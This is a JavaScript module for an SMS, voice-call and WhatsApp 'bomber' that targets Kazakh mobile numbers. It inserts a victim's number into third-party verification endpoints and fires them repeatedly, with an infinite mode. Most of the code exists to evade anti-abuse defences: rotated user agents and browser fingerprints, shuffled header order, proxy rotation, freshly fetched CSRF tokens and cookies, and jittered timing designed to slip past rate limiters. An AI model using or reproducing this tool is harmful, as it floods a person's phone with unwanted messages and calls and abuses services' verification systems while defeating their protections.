// bomber.js — single source of truth. server.js imports from here.
// Features: variants, undici proxies, UA fingerprinting, per-endpoint cooldown
// with 429-aware adaptive backoff, SMS/min cap with jitter, Accept-Language
// rotation, header-order shuffle, event ring buffer with cursor, force bypass,
// infinite-mode toggle.

import {readFile} from 'node:fs/promises';
import {fetch as uFetch, ProxyAgent} from 'undici';

const CONFIG_URL = new URL('./endpoints.json', import.meta.url);

export const KZ_MOBILE_PREFIXES = new Set([
  '700','701','702','703','704','705','706','707','708',
  '747','750','751','760','761','762','763','771',
  '775','776','777','778',
]);

// Diverse UA pool — Chrome major versions 148-154, Firefox 125-127, Safari 17.x,
// desktop (Win/Mac/Linux) and mobile (Android 13/14, iOS 16/17). Each fresh pick
// gets its own Sec-CH-UA/platform fingerprint derived from the UA string so no
// two requests look identical.
export const DEFAULT_UAS = [
  // Desktop Chrome Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.6577.102 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.6478.183 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.6391.169 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.6301.95 Safari/537.36',
  // Desktop Chrome Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.6577.102 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
  // Desktop Chrome Linux
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
  // Desktop Firefox
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:127.0) Gecko/20100101 Firefox/127.0',
  // Mac Safari
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
  // iOS
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
  // Android Chrome
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.6478.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; CPH2447) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.6301.181 Mobile Safari/537.36',
];

const ACCEPT_LANGS = [
  'ru-KZ,ru;q=0.9,kk;q=0.8,en;q=0.7',
  'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
  'kk-KZ,kk;q=0.9,ru;q=0.8,en;q=0.7',
  'en-US,en;q=0.9,ru;q=0.8,kk;q=0.7',
  'ru,en-US;q=0.9,en;q=0.8',
  'ru-RU,ru;q=0.9,kk-KZ;q=0.8,kk;q=0.7,en;q=0.6',
];

const EVENTS_RING_MAX = 2000;
const JOB_TTL_MS = 60 * 60 * 1000;
// On 429/503, extend THAT endpoint's cooldown by this factor; cap at BACKOFF_CAP_MS.
const BACKOFF_FACTOR = 2.0;
const BACKOFF_CAP_MS = 5 * 60 * 1000;
// Reset endpoint's adaptive backoff after this many consecutive clean hits.
const BACKOFF_RECOVERY_HITS = 5;

const randOf = a => a[Math.floor(Math.random() * a.length)];
const randInt = (min, max) => Math.floor(min + Math.random() * Math.max(1, max - min));
const jitter = ms => Math.floor(ms * (0.75 + Math.random() * 0.5)); // ±25%
const nowMs = () => Date.now();

function shuffledEntries(obj) {
  const entries = Object.entries(obj);
  for (let i = entries.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [entries[i], entries[j]] = [entries[j], entries[i]];
  }
  return entries;
}

export function uaFingerprint(ua) {
  const chrome = ua.match(/Chrome\/(\d+)/);
  const isMobile = /Mobile|Android|iPhone|iPad/.test(ua);
  if (chrome && !/Firefox|FxiOS/.test(ua)) {
    const v = chrome[1];
    const platform = /Android/.test(ua) ? '"Android"'
      : /iPhone|iPad/.test(ua) ? '"iOS"'
      : /Mac OS X/.test(ua) ? '"macOS"'
      : /Linux/.test(ua) ? '"Linux"' : '"Windows"';
    return {
      secChUa: `"Chromium";v="${v}", "Google Chrome";v="${v}", "Not A(Brand";v="99"`,
      mobile: isMobile ? '?1' : '?0',
      platform,
    };
  }
  if (/Firefox\//.test(ua)) {
    return { secChUa: null, mobile: isMobile ? '?1' : '?0', platform: /Linux/.test(ua) ? '"Linux"' : /Mac/.test(ua) ? '"macOS"' : '"Windows"' };
  }
  if (/Safari\//.test(ua) && /Version\//.test(ua)) {
    return { secChUa: null, mobile: isMobile ? '?1' : '?0', platform: /iPhone|iPad/.test(ua) ? '"iOS"' : '"macOS"' };
  }
  return { secChUa: '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"', mobile: '?0', platform: '"Windows"' };
}

export function normalizeKzPhone(raw, {force = false} = {}) {
  let s = String(raw || '').trim();
  const forcedFlag = s.endsWith('!');
  if (forcedFlag) s = s.slice(0, -1);
  const allowAny = force || forcedFlag;

  let digits = s.replace(/\D/g, '');
  if (digits.length === 11 && (digits[0] === '8' || digits[0] === '7')) digits = digits.slice(1);
  if (digits.length !== 10) {
    return {
      e164: null, e164_enc: null, raw: null, local8: null, national: null,
      display: null, display_enc: null, display_space: null, display_space_enc: null,
      prefix: null, valid: false, forced: allowAny,
      error: `expected 10 national digits, got ${digits.length}`,
    };
  }
  const prefix = digits.slice(0, 3);
  const validPrefix = KZ_MOBILE_PREFIXES.has(prefix);
  const valid = validPrefix || allowAny;
  const e164 = '+7' + digits;
  const display = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,8)}-${digits.slice(8,10)}`;
  const display_space = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)} ${digits.slice(6,8)} ${digits.slice(8,10)}`;
  return {
    e164,
    e164_enc: encodeURIComponent(e164),
    raw: '7' + digits,
    local8: '8' + digits,
    national: digits,
    display,
    display_enc: encodeURIComponent(display),
    display_space,
    display_space_enc: encodeURIComponent(display_space),
    prefix,
    valid,
    forced: allowAny && !validPrefix,
    error: valid ? null : `prefix ${prefix} not in KZ mobile set (append ! or pass force:true to override)`,
  };
}

export function substitutePhone(template, forms) {
  if (!template) return '';
  let out = String(template);
  const pairs = [
    ['{phone_display_space_enc}', forms.display_space_enc],
    ['{phone_display_space}',     forms.display_space],
    ['{phone_display_enc}',       forms.display_enc],
    ['{phone_display}',           forms.display],
    ['{phone_e164_enc}',          forms.e164_enc],
    ['{phone_national}',          forms.national],
    ['{phone_raw}',               forms.raw],
    ['{phone_8}',                 forms.local8],
    ['{phone_prefix}',            forms.prefix],
    ['{phone}',                   forms.e164],
  ];
  for (const [k, v] of pairs) out = out.split(k).join(v || '');
  return out;
}

export async function loadBomberConfig(url = CONFIG_URL) {
  const data = JSON.parse(await readFile(url, 'utf8'));
  const endpoints = (data.endpoints || [])
    .filter(e => e.enabled !== false)
    .map(e => ({
      name: e.name,
      method: (e.method || 'POST').toUpperCase(),
      url: e.url,
      channel: (e.channel || 'sms').toLowerCase(),
      contentType: e.content_type || 'application/json',
      body: e.body || '',
      headers: e.headers || {},
      preRequest: e.pre_request || null,
      variants: Array.isArray(e.variants) ? e.variants : null,
      priority: Number.isFinite(e.priority) ? Number(e.priority) : 1,
    }));
  return {
    endpoints,
    threads: Number(data.threads ?? 6),
    delayMinMs: Number(data.delay_min_ms ?? 200),
    delayMaxMs: Number(data.delay_max_ms ?? 1400),
    timeoutSec: Number(data.timeout_sec ?? 10),
    userAgents: Array.isArray(data.user_agents) && data.user_agents.length ? data.user_agents : DEFAULT_UAS,
    acceptLanguages: Array.isArray(data.accept_languages) && data.accept_languages.length ? data.accept_languages : ACCEPT_LANGS,
    proxies: Array.isArray(data.proxies) ? data.proxies : [],
    simulation: data.simulation_mode ?? true,
    smsPerMinute: Number(data.sms_per_minute ?? 60),
    perEndpointCooldownMs: Number(data.per_endpoint_cooldown_ms ?? 5000),
  };
}

function makeDispatcher(proxyStr, onBadProxy) {
  if (!proxyStr) return undefined;
  try { return new ProxyAgent(proxyStr); }
  catch (e) {
    if (onBadProxy) onBadProxy(proxyStr, e);
    return undefined;
  }
}

// Weighted pick by priority: voice > whatsapp > sms by default.
// A candidate's weight = max(0.1, priority). Expects >=1 candidate.
function weightedPick(candidates) {
  const weights = candidates.map(c => Math.max(0.1, c.priority || 1));
  const total = weights.reduce((s, w) => s + w, 0);
  let r = Math.random() * total;
  for (let i = 0; i < candidates.length; i++) {
    r -= weights[i];
    if (r <= 0) return candidates[i];
  }
  return candidates[candidates.length - 1];
}

/**
 * Fire a single endpoint. Each call derives a FRESH user-agent, Accept-Language,
 * Sec-CH-* fingerprint, proxy, and (if the endpoint declares one) a fresh
 * pre-request to pick up CSRF / cookies, so repeat hits never look identical.
 */
export async function fireEndpoint(ep, forms, cfg, hooks = {}) {
  const result = { name: ep.name, channel: ep.channel, ok: false, status: null, snippet: '' };

  if (cfg.simulation) {
    result.ok = true;
    result.status = 200;
    result.snippet = 'simulated';
    return result;
  }

  // Fresh fingerprint derivation PER CALL
  const ua = randOf(cfg.userAgents) || DEFAULT_UAS[0];
  const acceptLang = randOf(cfg.acceptLanguages || ACCEPT_LANGS);
  const roundProxy = cfg.proxies.length ? randOf(cfg.proxies) : null;
  const fp = uaFingerprint(ua);

  const variant = ep.variants && ep.variants.length ? randOf(ep.variants) : null;
  const baseHeaders = { ...(ep.headers || {}), ...(variant?.headers || {}) };
  const baseUrl = variant?.url || ep.url;
  const baseBody = variant?.body || ep.body;

  let url = substitutePhone(baseUrl, forms);
  let bodyStr = substitutePhone(baseBody, forms);

  // Build headers, substituting phone tokens, then shuffle order to break
  // simple header-order fingerprinting.
  const seeded = {};
  for (const [k, v] of Object.entries(baseHeaders)) seeded[k] = substitutePhone(String(v), forms);
  if (!seeded['User-Agent']) seeded['User-Agent'] = ua;
  if (!seeded['Accept-Language']) seeded['Accept-Language'] = acceptLang;
  if (fp.secChUa && !seeded['Sec-CH-UA']) seeded['Sec-CH-UA'] = fp.secChUa;
  if (!seeded['Sec-CH-UA-Mobile']) seeded['Sec-CH-UA-Mobile'] = fp.mobile;
  if (!seeded['Sec-CH-UA-Platform']) seeded['Sec-CH-UA-Platform'] = fp.platform;
  if (!seeded['Sec-Fetch-Dest']) seeded['Sec-Fetch-Dest'] = 'empty';
  if (!seeded['Sec-Fetch-Mode']) seeded['Sec-Fetch-Mode'] = 'cors';
  if (!seeded['Sec-Fetch-Site']) seeded['Sec-Fetch-Site'] = 'same-origin';
  if (ep.contentType && !seeded['Content-Type']) seeded['Content-Type'] = ep.contentType;

  const headers = Object.fromEntries(shuffledEntries(seeded));

  const dispatcher = makeDispatcher(roundProxy, hooks.onBadProxy);

  let preCookies = '';
  let extraHeader = null;

  // Fresh pre-request EVERY call — never reuse CSRF tokens or cookies between hits.
  if (ep.preRequest) {
    const preUrl = substitutePhone(ep.preRequest.url || '', forms);
    const preMethod = (ep.preRequest.method || 'GET').toUpperCase();
    const preHeaders = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': acceptLang,
    };
    if (fp.secChUa) {
      preHeaders['Sec-CH-UA'] = fp.secChUa;
      preHeaders['Sec-CH-UA-Mobile'] = fp.mobile;
      preHeaders['Sec-CH-UA-Platform'] = fp.platform;
    }
    Object.assign(preHeaders, ep.preRequest.headers || {});
    try {
      const preRes = await uFetch(preUrl, { method: preMethod, headers: preHeaders, redirect: 'manual', dispatcher });
      const text = await preRes.text();
      const setCookies = preRes.headers.getSetCookie ? preRes.headers.getSetCookie() : [];
      preCookies = setCookies.map(c => c.split(';')[0]).join('; ');
      const extract = ep.preRequest.extract || {};
      let token = '';
      if (extract.pattern) {
        const m = text.match(new RegExp(extract.pattern));
        token = m ? m[1] : '';
      }
      if (extract.into) {
        bodyStr = bodyStr.split(extract.into).join(token);
        url = url.split(extract.into).join(token);
      }
      if (extract.header) extraHeader = [extract.header, token];
    } catch (e) {
      result.snippet = 'PRE_ERR:' + String(e.message || e).slice(0, 100);
      return result;
    }
  }

  if (extraHeader) headers[extraHeader[0]] = extraHeader[1];
  if (preCookies) headers['Cookie'] = headers['Cookie'] ? headers['Cookie'] + '; ' + preCookies : preCookies;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), cfg.timeoutSec * 1000);
  try {
    const opts = { method: ep.method, headers, redirect: 'manual', signal: controller.signal };
    if (dispatcher) opts.dispatcher = dispatcher;
    if (ep.method !== 'GET' && ep.method !== 'HEAD') opts.body = bodyStr;
    const r = await uFetch(url, opts);
    result.status = r.status;
    result.ok = r.status >= 200 && r.status < 400;
    const loc = r.headers.get('location') || '';
    if (loc) result.snippet = loc.slice(0, 120);
    else {
      const t = await r.text();
      result.snippet = t.slice(0, 120).replace(/\n/g, ' ');
    }
    // Surface Retry-After to the caller so it can extend the cooldown.
    const retryAfter = r.headers.get('retry-after');
    if (retryAfter) {
      const secs = /^\d+$/.test(retryAfter) ? Number(retryAfter) : null;
      if (secs !== null && Number.isFinite(secs)) result.retryAfterMs = secs * 1000;
    }
  } catch (e) {
    result.snippet = String(e.message || e).slice(0, 120);
  } finally {
    clearTimeout(timer);
  }
  return result;
}

// ---------- job manager ----------

const jobs = new Map();

function pruneJobs() {
  const t = nowMs();
  for (const [id, j] of jobs) if (t - j.startedAt > JOB_TTL_MS) jobs.delete(id);
}

function pushEvent(job, ev) {
  job.seqCounter++;
  ev.seq = job.seqCounter;
  ev.at = nowMs();
  job.events.push(ev);
  if (job.events.length > EVENTS_RING_MAX) job.events.splice(0, job.events.length - EVENTS_RING_MAX);
}

export function getJob(id) { return jobs.get(id) || null; }
export function stopJob(id) {
  const j = jobs.get(id);
  if (j) { j.stopRequested = true; return true; }
  return false;
}

export function snapshotJob(j, { since = 0 } = {}) {
  const events = since > 0 ? j.events.filter(e => e.seq > since) : j.events;
  return {
    id: j.id,
    phone: j.phone,
    total: j.infinite ? null : j.total,
    infinite: j.infinite,
    sent: j.sent,
    failed: j.failed,
    done: j.done,
    stopped: j.stopped,
    elapsed: Math.round((nowMs() - j.startedAt) / 100) / 10,
    cursor: j.seqCounter,
    events,
  };
}

/**
 * runBomberJob(rawPhone, count, channel, simulation, liveProxies, opts)
 *
 * opts:
 *   force    — bypass KZ prefix check
 *   infinite — ignore count, run until stopJob() is called
 *   configUrl — override endpoints.json location
 *   onLog    — hook for structured log lines
 */
export async function runBomberJob(rawPhone, count, channel, simulation, liveProxies, {
  force = false,
  infinite = false,
  configUrl = CONFIG_URL,
  onLog = null,
} = {}) {
  pruneJobs();

  if (!infinite) {
    if (!Number.isInteger(count) || count < 1 || count > 1000) {
      throw new Error('count must be 1..1000');
    }
  }
  const forms = normalizeKzPhone(rawPhone, { force });
  if (!forms.e164) throw new Error(forms.error);
  if (!forms.valid) throw new Error(forms.error);

  let want;
  if (channel === 'sms') want = new Set(['sms']);
  else if (channel === 'voice' || channel === 'call') want = new Set(['voice', 'call']);
  else if (channel === 'whatsapp' || channel === 'wa') want = new Set(['whatsapp', 'wa']);
  else want = new Set(['sms', 'voice', 'call', 'whatsapp', 'wa']);

  const cfg = await loadBomberConfig(configUrl);
  cfg.simulation = simulation !== false;
  if (Array.isArray(liveProxies) && liveProxies.length) cfg.proxies = liveProxies;

  const id = Math.random().toString(36).slice(2, 10);
  const job = {
    id,
    phone: forms.e164,
    total: infinite ? null : count,
    infinite,
    sent: 0,
    failed: 0,
    done: false,
    stopped: false,
    stopRequested: false,
    events: [],
    seqCounter: 0,
    startedAt: nowMs(),
    forms,
    cfg,
    want,
  };
  jobs.set(id, job);

  const onBadProxy = (p, e) => {
    if (onLog) onLog({ event: 'bomber_bad_proxy', proxy: p, error: String(e.message || e).slice(0, 120) });
  };

  (async () => {
    try {
      const eligible = cfg.endpoints.filter(e => want.has(e.channel));
      if (!eligible.length) {
        pushEvent(job, { phone: job.phone, channel: 'system', name: 'worker', status: 'failed', http: null, error: `no endpoints for channel ${channel}` });
        return;
      }
      const perMinute = Math.max(1, cfg.smsPerMinute);
      const baseIntervalMs = Math.max(50, Math.floor(60000 / perMinute));
      const baseCooldown = Math.max(500, cfg.perEndpointCooldownMs);

      // Per-endpoint adaptive state: lastHit timestamp, current cooldown
      // (grows on 429/503), and consecutive-clean-hit counter to decay back.
      const epState = new Map();
      for (const e of eligible) epState.set(e.name, { lastHit: 0, cooldown: baseCooldown, cleanStreak: 0 });

      const active = new Set();
      let dispatched = 0;

      const tickOnce = () => {
        if (job.stopRequested) return;
        if (!job.infinite && dispatched >= job.total) return;
        const now = nowMs();
        const candidates = eligible.filter(ep => {
          if (active.has(ep.name)) return false;
          const st = epState.get(ep.name);
          return now - st.lastHit >= st.cooldown;
        });
        if (!candidates.length) return;

        const ep = weightedPick(candidates);
        const st = epState.get(ep.name);
        active.add(ep.name);
        st.lastHit = now;
        dispatched++;

        (async () => {
          try {
            const r = await fireEndpoint(ep, forms, cfg, { onBadProxy });
            if (r.ok) {
              job.sent++;
              st.cleanStreak++;
              if (st.cleanStreak >= BACKOFF_RECOVERY_HITS && st.cooldown > baseCooldown) {
                st.cooldown = Math.max(baseCooldown, Math.floor(st.cooldown / BACKOFF_FACTOR));
                st.cleanStreak = 0;
              }
            } else {
              job.failed++;
              st.cleanStreak = 0;
              // Adaptive backoff on rate-limit / server-side throttle
              if (r.status === 429 || r.status === 503 || r.status === 509) {
                const next = r.retryAfterMs
                  ? Math.max(st.cooldown, r.retryAfterMs)
                  : Math.min(BACKOFF_CAP_MS, Math.floor(st.cooldown * BACKOFF_FACTOR));
                st.cooldown = next;
                if (onLog) onLog({ event: 'bomber_backoff', endpoint: ep.name, status: r.status, new_cooldown_ms: next });
              }
            }
            pushEvent(job, {
              phone: forms.e164,
              channel: r.channel,
              name: r.name,
              status: r.ok ? 'sent' : 'failed',
              http: r.status,
              error: r.ok ? null : (r.snippet || '').slice(0, 120),
            });
          } catch (e) {
            job.failed++;
            st.cleanStreak = 0;
            pushEvent(job, {
              phone: forms.e164,
              channel: ep.channel,
              name: ep.name,
              status: 'failed',
              http: null,
              error: String(e.message || e).slice(0, 120),
            });
          } finally {
            active.delete(ep.name);
          }
        })();
      };

      // Self-scheduling jitter loop: each tick picks the next delay in
      // [0.75x, 1.25x] of baseIntervalMs, so request spacing never looks
      // periodic to a rate limiter.
      await new Promise(resolve => {
        let stopped = false;
        const schedule = () => {
          if (stopped) return;
          if (job.stopRequested) {
            job.stopped = true;
            stopped = true;
            // Wait for active workers to drain
            const drain = setInterval(() => {
              if (active.size === 0) { clearInterval(drain); resolve(); }
            }, 100);
            return;
          }
          if (!job.infinite && dispatched >= job.total && active.size === 0) {
            stopped = true;
            resolve();
            return;
          }
          tickOnce();
          setTimeout(schedule, jitter(baseIntervalMs));
        };
        schedule();
      });
    } catch (err) {
      pushEvent(job, {
        phone: job.phone,
        channel: 'system',
        name: 'worker',
        status: 'failed',
        http: null,
        error: String(err.message || err).slice(0, 160),
      });
    } finally {
      job.done = true;
    }
  })();

  return { id, phone: forms.e164, total: job.total, infinite: job.infinite };
}

export const JOB_EVENTS_RING_MAX = EVENTS_RING_MAX;
export { randOf, randInt as randDelay };
